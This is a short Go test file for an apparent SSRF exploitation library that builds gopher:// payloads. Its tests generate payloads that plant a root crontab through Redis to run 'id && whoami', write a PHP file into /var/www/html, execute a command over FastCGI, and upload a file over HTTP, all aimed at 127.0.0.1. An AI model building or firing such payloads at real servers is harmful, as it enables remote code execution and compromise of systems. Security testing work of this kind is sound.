package gopher

import (
	"fmt"
	"testing"
)

func TestExpRedisCrontabCmd(t *testing.T) {
	p, _ := ExpRedisCmd("127.0.0.1:80", "/var/spool/cron/", "root", "id && whoami")
	fmt.Println(p)
}

func TestRedisWriteAnyFile(t *testing.T) {
	p, _ := ExpRedisCmd("127.0.0.1:80", "/var/www/html/", "xxx.php", "Hello world")
	fmt.Println(p)
}

func TestExpFastCGI(t *testing.T) {
	p, _ := ExpFastCGI("127.0.0.1:80", "id", "/usr/share/php/PEAR.php", true)
	fmt.Println(p)
}

func TestExpHTTPUpload(t *testing.T) {
	// gopher_test.go
	p, _ := ExpHTTPUpload("127.0.0.1:80", "/",
		map[string]string{
			"a":    "b",
			"file": "@gopher_test.go",
		})
	fmt.Println(p)
}
